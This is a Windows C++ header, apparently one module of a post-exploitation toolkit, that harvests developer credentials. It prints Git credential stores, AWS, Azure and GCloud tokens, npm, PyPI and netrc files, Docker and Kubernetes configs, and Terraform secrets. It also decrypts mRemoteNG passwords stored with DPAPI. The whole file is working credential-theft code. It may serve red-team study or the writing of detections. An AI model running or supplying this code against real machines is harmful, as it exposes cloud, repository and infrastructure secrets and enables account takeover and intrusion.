#ifndef DEV_CREDENTIALS_DUMP_H
#define DEV_CREDENTIALS_DUMP_H

// Harvests credentials from developer tooling and CLI utilities:
// Git, cloud CLIs (AWS, Azure, GCloud), package managers (NPM, PyPI),
// Docker, Kubernetes, Terraform, Ansible, remote access clients.
// All operations run in the current user context.
//
// Cryptographic key material (SSH keys, GPG, VPN, raw PEM/KEY files)
// lives in CryptoKeysDump.h, not here.

#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>
#include <regex>

#pragma comment(lib, "crypt32.lib")

namespace DevCredentialsDump {

    static constexpr size_t kMaxFileSize = 5 * 1024 * 1024;

    inline void PrintFile(const std::filesystem::path& p, size_t maxBytes = 16384) {
        std::error_code ec;
        auto size = std::filesystem::file_size(p, ec);
        if (ec || size > kMaxFileSize) return;

        std::ifstream f(p, std::ios::binary);
        if (!f) return;
        std::string content((std::istreambuf_iterator<char>(f)),
                            std::istreambuf_iterator<char>());
        if (content.size() > maxBytes) content.resize(maxBytes);

        std::cout << "\n[+] " << p.string() << "\n" << content << "\n";
    }

    inline std::vector<BYTE> Base64Decode(const std::string& b64) {
        DWORD dwLen = 0;
        CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, NULL, &dwLen, NULL, NULL);
        std::vector<BYTE> out(dwLen);
        CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, out.data(), &dwLen, NULL, NULL);
        return out;
    }

    // ---- mRemoteNG (DPAPI-protected passwords) ----

    inline void ParseMRemoteNG(const std::filesystem::path& path) {
        std::ifstream f(path);
        std::string content((std::istreambuf_iterator<char>(f)),
                            std::istreambuf_iterator<char>());
        std::regex re("Password=\"([^\"]*)\"");
        auto begin = std::sregex_iterator(content.begin(), content.end(), re);
        auto end = std::sregex_iterator();
        for (auto it = begin; it != end; ++it) {
            std::string b64 = (*it)[1];
            if (b64.empty()) continue;
            auto enc = Base64Decode(b64);
            DATA_BLOB in{ static_cast<DWORD>(enc.size()), enc.data() };
            DATA_BLOB out{ 0, nullptr };
            if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) {
                std::string dec(reinterpret_cast<char*>(out.pbData), out.cbData);
                std::cout << "  [mRemoteNG] Password: " << dec << "\n";
                LocalFree(out.pbData);
            }
        }
    }

    // ---- Git ----

    inline void DumpGit(const std::filesystem::path& up) {
        std::cout << "\n--- Git ---\n";
        auto gitCred = up / ".git-credentials";
        if (std::filesystem::exists(gitCred)) PrintFile(gitCred);

        auto gitConfig = up / ".gitconfig";
        if (std::filesystem::exists(gitConfig)) PrintFile(gitConfig);
    }

    // ---- Cloud CLIs ----

    inline void DumpCloudCLIs(const std::filesystem::path& up,
                              const std::filesystem::path& appData) {
        std::cout << "\n--- Cloud CLIs ---\n";

        // AWS
        auto awsCred = up / ".aws" / "credentials";
        if (std::filesystem::exists(awsCred)) PrintFile(awsCred);
        auto awsConfig = up / ".aws" / "config";
        if (std::filesystem::exists(awsConfig)) PrintFile(awsConfig);

        // Azure
        auto azureProfile = up / ".azure" / "azureProfile.json";
        if (std::filesystem::exists(azureProfile)) PrintFile(azureProfile);
        auto azureTokens = up / ".azure" / "accessTokens.json";
        if (std::filesystem::exists(azureTokens)) PrintFile(azureTokens);

        // GCloud
        auto gcloudAdc = appData / "gcloud" / "application_default_credentials.json";
        if (std::filesystem::exists(gcloudAdc)) PrintFile(gcloudAdc);
        auto gcloudDb = appData / "gcloud" / "credentials.db";
        if (std::filesystem::exists(gcloudDb)) {
            std::cout << "[i] gcloud credentials.db (SQLite): "
                      << gcloudDb.string() << "\n";
        }
    }

    // ---- Package managers ----

    inline void DumpPackageManagers(const std::filesystem::path& up) {
        std::cout << "\n--- Package Managers ---\n";

        auto npmrc = up / ".npmrc";
        if (std::filesystem::exists(npmrc)) PrintFile(npmrc);

        auto pypirc = up / ".pypirc";
        if (std::filesystem::exists(pypirc)) PrintFile(pypirc);

        auto netrc1 = up / ".netrc";
        auto netrc2 = up / "_netrc";
        if (std::filesystem::exists(netrc1)) PrintFile(netrc1);
        if (std::filesystem::exists(netrc2)) PrintFile(netrc2);

        auto gemrc = up / ".gem" / "credentials";
        if (std::filesystem::exists(gemrc)) PrintFile(gemrc);
    }

    // ---- Containers / orchestration ----

    inline void DumpContainers(const std::filesystem::path& up) {
        std::cout << "\n--- Containers & Orchestration ---\n";

        auto docker = up / ".docker" / "config.json";
        if (std::filesystem::exists(docker)) PrintFile(docker);

        auto kube = up / ".kube" / "config";
        if (std::filesystem::exists(kube)) PrintFile(kube, 32768);
    }

    // ---- Infrastructure as code ----

    inline void DumpIaC(const std::filesystem::path& up) {
        std::cout << "\n--- Infrastructure as Code ---\n";

        auto tfrc = up / ".terraformrc";
        if (std::filesystem::exists(tfrc)) PrintFile(tfrc);

        auto tfCreds = up / ".terraform.d" / "credentials.tfrc.json";
        if (std::filesystem::exists(tfCreds)) PrintFile(tfCreds);

        auto ansibleCfg = up / ".ansible.cfg";
        if (std::filesystem::exists(ansibleCfg)) PrintFile(ansibleCfg);
    }

    // ---- Remote access clients ----

    inline void DumpRemoteAccess(const std::filesystem::path& up,
                                 const std::filesystem::path& appData) {
        std::cout << "\n--- Remote Access Clients ---\n";

        auto mremote = appData / "mRemoteNG" / "confCons.xml";
        if (std::filesystem::exists(mremote)) ParseMRemoteNG(mremote);

        auto moba = appData / "MobaXterm" / "MobaXterm.ini";
        if (std::filesystem::exists(moba)) PrintFile(moba);
    }

    // ---- Orchestrator ----

    inline void Run() {
        std::cout << "\n=== Developer / CLI Credentials ===\n";

        const char* upEnv = std::getenv("USERPROFILE");
        const char* adEnv = std::getenv("APPDATA");
        if (!upEnv) return;

        std::filesystem::path userProfile(upEnv);
        std::filesystem::path appData(adEnv ? adEnv : "");

        DumpGit(userProfile);
        DumpCloudCLIs(userProfile, appData);
        DumpPackageManagers(userProfile);
        DumpContainers(userProfile);
        DumpIaC(userProfile);
        DumpRemoteAccess(userProfile, appData);
    }
}

#endif